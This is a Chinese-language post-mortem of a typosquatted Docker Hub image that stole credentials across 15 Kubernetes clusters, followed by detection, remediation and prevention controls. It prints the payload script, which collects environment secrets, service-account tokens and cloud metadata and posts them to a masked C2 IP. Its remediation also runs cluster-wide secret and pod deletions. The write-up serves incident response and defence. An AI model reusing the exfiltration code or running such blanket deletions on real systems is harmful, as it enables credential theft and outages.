# 供应链攻击——恶意镜像注入排查：一个字母之差，15 个生产集群全部沦陷

## 常见搜索词

- 容器供应链攻击案例
- 恶意 docker 镜像事件
- docker 镜像钓鱼
- kubernetes 镜像安全扫描
- 如何验证容器镜像完整性

---

## 故障经过

**环境**: 15 个 Kubernetes 集群（dev/staging/prod 跨 3 个云区域），500+ 微服务，多团队自主管理部署。

**时间**: 周三 11:30。SIEM 告警：多个容器的出站 TLS 连接到东欧的未知 IP。

**初始症状**: 几个刚部署的 Pod 每隔 5 分钟向 `185.xxx.xxx.xxx:443` 发送 HTTPS 请求——这个 IP 不属于应用依赖的任何已知服务。

```bash
# 网络流日志
来源: api-service-7d9f8c6b-x (10.244.3.15)
目标: 185.xxx.xxx.xxx:443 (未知)
流量: 2.3 MB 出站（每 5 分钟一次）
进程: /usr/bin/python3 /app/collect.py
```

**影响**: 5 天内 15 个集群的集群凭证、数据库连接字符串、云 metadata 被窃取。

---

## 背景

一个流行的 Python Redis 客户端库（`redis-utils`）在 Docker Hub 上发布了镜像。正版库有数千个 Star，被广泛使用。

攻击者创建了一个钓鱼包：`redus-utils`（少了一个 'i'）。他们在 Docker Hub 上发布了 `redus-utils/latest` 镜像，其中包含恶意层：

1. 扫描环境变量找 `AWS_`、`AZURE_`、`GOOGLE_`、`KUBERNETES_`、`DB_`、`PASSWORD`
2. 读取 `/var/run/secrets/kubernetes.io/serviceaccount/token`
3. 查询云 metadata 端点（169.254.169.254）
4. 每 5 分钟通过 HTTPS 将所有数据发送到 C2 服务器

这个恶意镜像在 Docker Hub 上存活了 3 个月。多名开发者因以下原因意外使用了它：
- 从不正规的博客教程中复制粘贴，教程恰好引用了钓鱼名称
- Dockerfile 中手动输入错误（`redus-utils` 而非 `redis-utils`）
- CI/CD 配置自动补全建议了恶意名称

---

## 排查过程

### 第一步：识别恶意镜像

```bash
kubectl get pod api-service-7d9f8c6b-x -o json | jq -r '.spec.containers[].image'
# 输出: docker.io/redus-utils/latest:1.2.3
```

镜像名 `redus-utils` 不是已知的内部镜像，由 Docker Hub 上的外部用户发布。

### 第二步：确定感染范围

```bash
# 检查哪些资源引用了这个镜像
for ns in $(kubectl get ns -o name); do
  kubectl get deployment,statefulset,daemonset -n $ns -o json 2>/dev/null | \
    jq -r '.items[] | select(.spec.template.spec.containers[].image | contains("redus-utils")) | "\($ns)/\(.metadata.name)"'
done
```

该镜像被用于 15 个集群的 23 个 Deployment 中。

### 第三步：溯源

```bash
# 检查各集群的镜像拉取历史
kubectl get events --all-namespaces | grep "redus-utils" | head -10
```

首次拉取发生在 5 天前的开发集群。此后 5 天，镜像通过 CI/CD 管道和开发者复制配置的方式传播到其他集群。

### 第四步：分析恶意行为

```bash
# 检查镜像中可疑历史层
docker history redus-utils:latest --no-trunc | grep -i "collect\|exfil\|upload\|curl"
```

恶意层添加了 Python 脚本 `/app/collect.py`：

```python
# 恶意负载伪代码
import os, requests

# 收集环境变量
env_data = {k: v for k, v in os.environ.items() 
            if any(k.startswith(p) for p in ["AWS_", "DB_", "KUBERNETES_", "PASSWORD"])}

# 收集 Kubernetes ServiceAccount token
try:
    with open("/var/run/secrets/kubernetes.io/serviceaccount/token") as f:
        env_data["k8s_token"] = f.read()
except: pass

# 收集云 metadata
try:
    r = requests.get("http://169.254.169.254/latest/meta-data/", timeout=2)
    env_data["cloud_metadata"] = r.text
except: pass

# 每 5 分钟外传一次
while True:
    requests.post("https://185.xxx.xxx.xxx/c2", json=env_data)
    time.sleep(300)
```

---

## 根因

1. **无镜像白名单**：团队可以不受限制地从任何仓库拉取任何镜像
2. **无镜像扫描**：Docker Hub 镜像在部署前没有扫描漏洞或恶意内容
3. **无镜像策略执行**：没有准入控制器限制可用的仓库或镜像
4. **钓鱼意识缺失**：开发者未接受验证镜像来源的培训
5. **无 SBOM（软件物料清单）**：没有全集群镜像和依赖的追踪
6. **ServiceAccount 权限过大**：挂载的 ServiceAccount token 权限超过所需

## 解决方案

### 紧急处置

```bash
# 1. 阻断到 C2 服务器的出站流量
# 在集群网络层面封禁该 IP

# 2. 识别并删除所有使用恶意镜像的 Pod
kubectl get pods --all-namespaces -o json | jq -r '
  .items[] | select(.spec.containers[].image | contains("redus-utils")) |
  "\(.metadata.namespace) \(.metadata.name)"
' | while read ns pod; do
  kubectl delete pod -n $ns $pod
done

# 3. 在准入层面封禁该镜像
kubectl apply -f - <<EOF
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sBlockRegistries
metadata:
  name: block-redus-utils
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    deniedImages:
      - "redus-utils/*"
EOF
```

### 轮换所有被泄露的凭据

```bash
# 轮换受影响命名空间中所有 ServiceAccount token
kubectl delete secret --all-namespaces -l kubernetes.io/service-account.name
kubectl delete pod --all-namespaces --all

# 轮换云提供商凭据（AWS Access Keys 等）
# 轮换环境变量中引用的所有数据库密码
```

### 部署镜像安全控制措施

1. **OPA/Gatekeeper 镜像白名单**：

```yaml
apiVersion: constraints.gatekeeper.sh/v1beta1
kind: K8sAllowedRegistries
metadata:
  name: allow-internal-registries
spec:
  match:
    kinds:
      - apiGroups: [""]
        kinds: ["Pod"]
  parameters:
    allowedRegistries:
      - "harbor.internal.company.com"
      - "gcr.io/company-project"
```

2. **Trivy 镜像扫描**：

```bash
trivy image --severity CRITICAL,HIGH gcr.io/company-project/api-service:latest
trivy image --exit-code 1 --severity CRITICAL gcr.io/company-project/api-service:latest
```

3. **软件物料清单 SBOM**：

```bash
trivy image --format cyclonedx -o sbom.json gcr.io/company-project/api-service:latest
```

4. **Cosign 镜像签名与验证**：

```bash
cosign sign --key cosign.key gcr.io/company-project/api-service:latest
cosign verify --key cosign.pub gcr.io/company-project/api-service:latest
```

### 监控

```bash
# Falco 规则：检测容器到未知外部的连接
- rule: Unexpected Outbound Connection
  desc: 检测容器连接到未知外部 IP
  condition: outbound and not known_destination
  output: "发现意外出站连接 (pod=%k8s.pod.name ip=%fd.sip)"
  priority: WARNING
```

## 经验教训

- **Docker Hub 是供应链攻击的新阵地**：钓鱼攻击在容器镜像仓库和包管理器上同样有效。验证每个镜像来源
- **镜像扫描不是可选项**：每个镜像部署前必须扫描，包括基础镜像，不只是应用层
- **ServiceAccount 最小权限**：被攻陷的 Token 权限过大。使用专用 ServiceAccount，赋予最小 RBAC 权限
- **准入控制白名单**：阻止未知镜像仓库的 Gatekeeper/OPA 策略可以完全避免此类攻击
- **监控出站流量**：数据外传持续了 5 天才被发现。东西向和出口流量监控能捕获数据泄露
- **SBOM 对应急响应至关重要**：不知道有哪些镜像在使用，识别受影响集群需要数天而非数小时

---

## 总结

攻击链路：

```
攻击者在 Docker Hub 发布钓鱼镜像（redus-utils 冒充 redis-utils）
→ 开发者在 Dockerfile 中手误或从不可信博客复制配置
→ CI/CD 构建并推送镜像到仓库
→ Kubernetes 部署了含恶意负载的 Pod
→ collect.py 扫描环境变量、K8s token、云 metadata
→ 每 5 分钟向 C2 服务器外传数据
→ 5 天内 15 个集群被入侵
```

发现：SIEM 告警标记了异常出站流量。修复：8 小时凭证轮换和策略部署。预防：镜像白名单 + 扫描 + Cosign 签名可在每个环节阻止这次攻击。信任什么，就验证什么——或者什么都不信，什么都验证。
